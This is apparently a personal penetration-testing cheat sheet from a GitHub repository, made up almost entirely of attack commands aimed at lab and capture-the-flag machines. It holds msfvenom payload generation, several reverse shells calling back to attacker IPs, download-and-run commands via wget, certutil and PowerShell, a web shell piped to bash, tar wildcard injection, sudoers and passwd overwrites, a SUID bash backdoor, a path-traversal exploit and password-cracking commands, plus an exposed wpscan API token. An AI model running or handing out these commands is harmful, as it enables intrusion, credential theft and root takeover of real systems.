https://github.com/findthehead/Cheatsheet
-------------------------------------------------<: shellcode generate :>-----------------------------------------------------------
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST 10.10.15.135 LPORT=1234 -f c -b \x00\x0a\x0d 
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.9.80.151 LPORT=8000 -b "\x00\x25\x26" -f python -v shellcode

sudo msfconsole -q -x "use exploit/multi/handler;\
set PAYLOAD windows/meterpreter/reverse_tcp;\
set LHOST 10.11.0.4;\
set LPORT 80;\
run"

#privesc
run post/multi/recon/local_exploit_suggester
getprivs
ps
migrate -N PROCESS_NAME
load kiwi
hashdump
run post/windows/manage/enable_rdp
--------------------------------------------------wpscan-------------------------------------------------------

wpscan --url http://10.10.156.7  --enumerate u,p --api-token ZuSVj6b6AMzEMk8k2X5a6Q0Zg18LZd0uOWqZVNSewss
---------------------------------------------------------------------------------------------------
for i in {1..600}; do ping -c 1 127.0.0.1:$i &> /dev/null && echo "Ping to 127.0.0.1:$i succeeded (i=$i)"; done
=================================================================================================
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.45.210
rdesktop -u username 10.10.83.110
---------------------------------------hydra_login_http_attack---------------------------------------------------------

hydra -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -p asdf 10.10.111.189 http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password."
---------------------------------------port_forwarding---------------------------------------------------

ssh -N system@10.0.2.3 -L 8080:192.168.1.5:80
---------------------------------------------------------------------------------------------------

curl shell:=> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.80.151 8000 >/tmp/f
--------------------------------------------------stable shell--------------------------------------------------------
SHELL=/bin/bash script -q /dev/null
python3 -c 'import pty; pty.spawn("/bin/bash") '

script /dev/null -c bash
# ctrl + z
stty raw -echo; fg
# enter (return) x2

socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
export TERM=xterm-256color
stty rows 22 columns 107

-------------------------------------------------------python_http_server-------------------------------------------

sudo python3 -m http.server 80
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")' id cap-setuid enable with python 

python3 -c 'import socket,pty,os;s=socket.socket();s.connect(("10.10.14.9",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/bash");'
----------------------------------------------------------------------------------------------
bash -c "bash -i >& /dev/tcp/10.9.80.151/7000 0>&1"
--------------------------------------------------------------------------------------------
find / -perm -u=s -type f 2>/dev/null 
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
------------------------------------------------------------------------------------------------------
echo '10.10.10.11 2million.htb' | sudo tee -a /etc/hosts
------------------------------------------------------------------------------------------------------
cat back.sh |base64 -w0                 -:decode
echo "hello world" |base64 -d		-:encode
----------------------------------mysql_login---------------------------------------------
mysql -h db -u root -proot cacti -e 'show tables;'
==============================================scp================================================
scp username@remote_ip:/path/on/remote/machine /path/to/local/destination

scp -r /path/to/local/directory username@remote_ip:/path/on/remote/machine(recurssively entire directory)
scp -i /path/to/private/key /path/to/local/file username@remote_ip:/path/on/remote/machine (with rsa key)
scp -P port_number /path/to/local/file username@remote_ip:/path/on/remote/machine (through unusual port number)
scp username@remote_ip1:/path/to/source/file username@remote_ip2:/path/to/destination/

========================================================ssh======================================
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.106.252
ssh user@ipaddress -oHostKeyAlgorithms=+ssh-rsa : if ssh not working

----------------------------------directory_brute------------------------------------------------------------------

gobuster dir -u http://xxxxxxxxxx -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k

gobuster dir -u http://xxxxxxxxxx  -w /usr/share/seclists/Discovery/Web-Content/common.txt

gobuster dir -u http://10.10.132.101:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt  -b 403

----------------------------------------------subdomain_brute------------------------------------------------------------
gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -u http://thetoppers.htb --append-domain Host: [word].thetoppers.htb
gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  -u https://futurevera.thm/ --append-domain Host: [word].futurevera.thm/ -k  => adding -k for https
----------------------------------------------------------------------------------------------------------------------
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
=============================================interactive_shell=======================

python3 -c 'import pty; pty.spawn("/bin/bash") '

SHELL=/bin/bash script -q /dev/null
CTRL+Z
stty raw -echo && fg
export TERM=xterm

=========================================================================================
mysql -h localhost -u app -p  :mysql login
./socat TCP4-LISTEN:8080,fork TCP4:127.0.0.1:80 :port forwarding with socat binary

============================bash_backdoor======================================================

bash -c 'exec bash -i &>/dev/tcp/10.9.80.151/7000<&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -I 2>&1|nc 192.168.49.249 80 >/tmp/f

find /usr/bin/python3 -exec {} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.1.42.127",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \;
===============================recieving a file from CMD=============================================

cmd.exe /C certutil -urlcache -split -f http://10.9.80.151:90/winPEASany.exe winpeas.exe

================================================================================================

mkpasswd -m sha-512 newpasswordhere:- Generate a new password hash with a password of your choice:
------------------------------------------------------------------------------------------

zip -r file.zip file_wants_to_zip
=================================================================================================
sed -i "s/$port = 1234;/$port = 4444;/g" php-reverse-shell.php

------------------------------shell_with_curl----------------------------------------------
http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.135:100/shel.sh|bash

powershell.exe (New-Object system.Net.WebClient).DownloadFile('http://10.15.35.5/payload.exe',' c:\Users\Public\whoami.exe')


 that includes a username, salted/hashed password, UID, GID, directory, and shell .
-----------------------------------------------------------------------------------------------------------------------------------
cadaver http://ip/webdav
-----------------------------------------------------openSSL-------------------------------------------------------------------------
#process to make SSL certificate throgh system

openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 


openssl passwd -1 -salt salt password : generating password and salt to add into shadow
username:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash

openssl enc -in fake passwd -out /etc/passwd : overwrite protected passwd file with openssl
https://www.youtube.com/watch?v=i3ecAqGlGcc


 puttygen [ File.ppk ] -O private-openssh -o [ File name.pem ]
=======================================wpscan===================================================

wpscan --url http://derpnstink.local/weblog/ --passwords /usr/share/wordlists/fasttrack.txt --usernames admin -t 25

wpscan --url http://derpnstink.local/weblog/ --enumerate u,p

===================================hashcrack=====================================================
john md5.hash --wordlist=fsocity.dic --format=Raw-MD5
john --format=NT -w=/usr/share/wordlists/rockyou.txt hash.txt --pot=output.txt

------------------------------------------------------------------------------------------------------------------
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt

hashcat -a 0 -m 1800 hash.txt rockyou.txt

hashcat --force -m 1600 -a 0 hash /home/kali/rockyou.txt 

-a	attack mode (0 = dictionary attack)
-m	mode to assign the hash algorithm (1800 = SHA512 UNIX)
hash.txt	file which contains the hash to crank
rockyou.txt	password wordlist


/bin/bash -c 'echo "edward ALL= (root) NOPASSWD: /usr/bin/sudo " >>/etc/sudoers'
curl 'http://10.10.239.45/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; whoami && pwd && id' -H "Content-Type: text/plain"


-------------------------------------------------------------------------------------------
touch shell.sh
cat shell.sh
#!bin/bash

cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash
now the bash is set with suid bit
/tmp/bash -p
enjoy root